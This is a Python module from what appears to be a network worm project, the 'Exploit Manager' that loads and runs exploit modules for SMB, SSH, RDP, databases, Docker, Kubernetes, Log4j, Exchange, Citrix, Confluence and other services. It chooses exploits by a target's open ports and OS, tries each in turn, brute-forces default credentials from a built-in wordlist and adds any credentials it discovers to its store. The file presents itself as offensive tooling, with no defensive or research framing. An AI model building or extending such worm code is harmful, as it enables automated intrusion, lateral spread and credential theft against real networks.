"""
ML Network Worm - Exploit Manager
Manages and executes exploitation attempts
"""

import time
import random
from typing import Dict, List, Optional, Tuple
from abc import ABC, abstractmethod

import sys
import os
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.logger import logger


class BaseExploit(ABC):
    """Base class for all exploits"""
    
    def __init__(self, name: str, target_ports: List[int], target_os: List[str] = None):
        self.name = name
        self.target_ports = target_ports
        self.target_os = target_os or ["Windows", "Linux", "Unknown"]
        self.stats = {'success': 0, 'failure': 0}
    
    @abstractmethod
    def check_vulnerable(self, target: Dict) -> bool:
        """Check if target is vulnerable"""
        pass
    
    @abstractmethod
    def exploit(self, target: Dict) -> Tuple[bool, Dict]:
        """
        Execute exploit
        Returns: (success, result_data)
        """
        pass
    
    def get_stats(self) -> Dict:
        """Get exploit statistics"""
        total = self.stats['success'] + self.stats['failure']
        success_rate = (self.stats['success'] / total * 100) if total > 0 else 0
        
        return {
            'name': self.name,
            'success_count': self.stats['success'],
            'failure_count': self.stats['failure'],
            'success_rate': success_rate
        }


class ExploitManager:
    """Manages all exploitation attempts"""
    
    def __init__(self, config):
        self.config = config
        self.exploits = []
        self.credentials_db = []
        
        # Load exploits
        self._load_exploits()
        
        # Load credentials
        self._load_credentials()
        
        logger.info("Exploit Manager initialized", {
            "exploit_count": len(self.exploits),
            "credentials_count": len(self.credentials_db)
        })
    
    def _load_exploits(self):
        """Load available exploits"""
        logger.info("Loading exploit modules...")
        
        # Import exploit modules
        from exploits.modules.smb_exploit import SMBExploit
        from exploits.modules.ssh_exploit import SSHExploit
        from exploits.modules.web_exploit import WebExploit
        from exploits.modules.rdp_exploit import RDP_Exploit
        from exploits.modules.ftp_exploit import FTP_Exploit
        from exploits.modules.mysql_exploit import MySQL_Exploit
        from exploits.modules.postgresql_exploit import PostgreSQL_Exploit
        from exploits.modules.redis_exploit import Redis_Exploit
        from exploits.modules.mongodb_exploit import MongoDB_Exploit
        from exploits.modules.telnet_exploit import Telnet_Exploit
        from exploits.modules.vnc_exploit import VNC_Exploit
        from exploits.modules.snmp_exploit import SNMP_Exploit
        from exploits.modules.docker_exploit import Docker_Exploit
        
        # Import NEW advanced exploits
        from exploits.modules.jenkins_exploit import Jenkins_Exploit
        from exploits.modules.elasticsearch_exploit import Elasticsearch_Exploit
        from exploits.modules.mssql_exploit import MSSQL_Exploit
        from exploits.modules.kubernetes_exploit import Kubernetes_Exploit
        # from exploits.modules.tomcat_exploit import Tomcat_Exploit  # TODO: Fix file creation
        
        # Import CRITICAL exploits (high-impact)
        from exploits.modules.struts_exploit import Struts_Exploit
        from exploits.modules.log4j_exploit import Log4j_Exploit
        from exploits.modules.exchange_exploit import Exchange_Exploit
        from exploits.modules.weblogic_exploit import WebLogic_Exploit
        from exploits.modules.citrix_exploit import Citrix_Exploit
        
        # Import COMMON exploits (widespread)
        from exploits.modules.confluence_exploit import Confluence_Exploit
        from exploits.modules.jira_exploit import Jira_Exploit
        from exploits.modules.gitlab_exploit import GitLab_Exploit
        
        # Add enabled exploits
        if self.config.exploit.enable_smb:
            self.exploits.append(SMBExploit())
        
        if self.config.exploit.enable_ssh:
            self.exploits.append(SSHExploit())
        
        if self.config.exploit.enable_web:
            self.exploits.append(WebExploit())
        
        # Add existing exploits (always enabled)
        self.exploits.append(RDP_Exploit())
        self.exploits.append(FTP_Exploit())
        self.exploits.append(MySQL_Exploit())
        self.exploits.append(PostgreSQL_Exploit())
        self.exploits.append(Redis_Exploit())
        self.exploits.append(MongoDB_Exploit())
        self.exploits.append(Telnet_Exploit())
        self.exploits.append(VNC_Exploit())
        self.exploits.append(SNMP_Exploit())
        self.exploits.append(Docker_Exploit())
        
        # Add NEW advanced exploits (always enabled)
        self.exploits.append(Jenkins_Exploit())
        self.exploits.append(Elasticsearch_Exploit())
        self.exploits.append(MSSQL_Exploit())
        self.exploits.append(Kubernetes_Exploit())
        # self.exploits.append(Tomcat_Exploit())  # TODO: Fix file creation
        
        # Add CRITICAL exploits (always enabled) - HIGH IMPACT
        self.exploits.append(Struts_Exploit())
        self.exploits.append(Log4j_Exploit())
        self.exploits.append(Exchange_Exploit())
        self.exploits.append(WebLogic_Exploit())
        self.exploits.append(Citrix_Exploit())
        
        # Add COMMON exploits (always enabled) - WIDESPREAD
        self.exploits.append(Confluence_Exploit())
        self.exploits.append(Jira_Exploit())
        self.exploits.append(GitLab_Exploit())
        
        logger.success(f"Loaded {len(self.exploits)} exploit modules")
    
    def _load_credentials(self):
        """Load credential wordlist"""
        # Common credentials
        self.credentials_db = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('administrator', 'administrator'),
            ('root', 'root'),
            ('root', 'toor'),
            ('user', 'user'),
            ('guest', 'guest'),
            ('test', 'test'),
            ('admin', '123456'),
            ('admin', 'admin123'),
        ]
        
        # Load from file if exists
        if os.path.exists(self.config.exploit.credential_wordlist):
            try:
                with open(self.config.exploit.credential_wordlist, 'r') as f:
                    for line in f:
                        if ':' in line:
                            user, pwd = line.strip().split(':', 1)
                            self.credentials_db.append((user, pwd))
            except Exception as e:
                logger.warning(f"Failed to load credentials: {e}")
    
    def select_exploits(self, target: Dict) -> List[BaseExploit]:
        """
        Select appropriate exploits for target
        
        Args:
            target: Target information from scanner
        
        Returns:
            List of applicable exploits
        """
        applicable = []
        
        open_ports = target.get('open_ports', [])
        os_guess = target.get('os_guess', 'Unknown')
        
        for exploit in self.exploits:
            # Check if target has required ports
            if any(port in open_ports for port in exploit.target_ports):
                # Check if OS matches
                if os_guess in exploit.target_os or 'Unknown' in exploit.target_os:
                    # Check vulnerability
                    if exploit.check_vulnerable(target):
                        applicable.append(exploit)
        
        return applicable
    
    def exploit_target(self, target: Dict) -> Tuple[bool, Optional[Dict]]:
        """
        Attempt to exploit target
        
        Args:
            target: Target information
        
        Returns:
            (success, exploit_result)
        """
        ip = target['ip']
        logger.info(f"Attempting exploitation of {ip}")
        
        # Select applicable exploits
        exploits = self.select_exploits(target)
        
        if not exploits:
            logger.warning(f"No applicable exploits for {ip}")
            return False, None
        
        logger.info(f"Found {len(exploits)} applicable exploits for {ip}")
        
        # Try each exploit
        for exploit in exploits:
            logger.info(f"Trying {exploit.name} on {ip}")
            
            try:
                success, result = exploit.exploit(target)
                
                if success:
                    logger.log_exploit(ip, exploit.name, True, result)
                    return True, result
                else:
                    logger.log_exploit(ip, exploit.name, False, result)
                
                # Delay between attempts
                time.sleep(self.config.exploit.exploit_timeout / 10)
                
            except Exception as e:
                logger.error(f"Exploit {exploit.name} failed: {e}")
        
        logger.warning(f"All exploits failed for {ip}")
        return False, None
    
    def get_credentials(self, limit: int = 10) -> List[Tuple[str, str]]:
        """Get credentials for brute force"""
        if limit >= len(self.credentials_db):
            return self.credentials_db
        
        # Return random sample
        return random.sample(self.credentials_db, limit)
    
    def add_credential(self, username: str, password: str):
        """Add discovered credential to database"""
        cred = (username, password)
        if cred not in self.credentials_db:
            self.credentials_db.append(cred)
            logger.success(f"New credential added: {username}")
    
    def get_statistics(self) -> Dict:
        """Get exploitation statistics"""
        stats = {
            'total_exploits': len(self.exploits),
            'exploits': []
        }
        
        for exploit in self.exploits:
            stats['exploits'].append(exploit.get_stats())
        
        return stats
    
    def print_statistics(self):
        """Print exploitation statistics"""
        print("\n" + "="*60)
        print("EXPLOITATION STATISTICS")
        print("="*60)
        
        for exploit in self.exploits:
            stats = exploit.get_stats()
            print(f"\n{stats['name']}:")
            print(f"  Success: {stats['success_count']}")
            print(f"  Failure: {stats['failure_count']}")
            print(f"  Success Rate: {stats['success_rate']:.1f}%")
        
        print("="*60 + "\n")


if __name__ == "__main__":
    from config import Config
    
    config = Config()
    manager = ExploitManager(config)
    
    print(f"Loaded {len(manager.exploits)} exploits")
    print(f"Loaded {len(manager.credentials_db)} credentials")
    
    # Test target
    test_target = {
        'ip': '192.168.1.100',
        'open_ports': [22, 80, 445],
        'os_guess': 'Windows',
        'banners': {}
    }
    
    exploits = manager.select_exploits(test_target)
    print(f"\nApplicable exploits for test target: {len(exploits)}")
    for exp in exploits:
        print(f"  - {exp.name}")
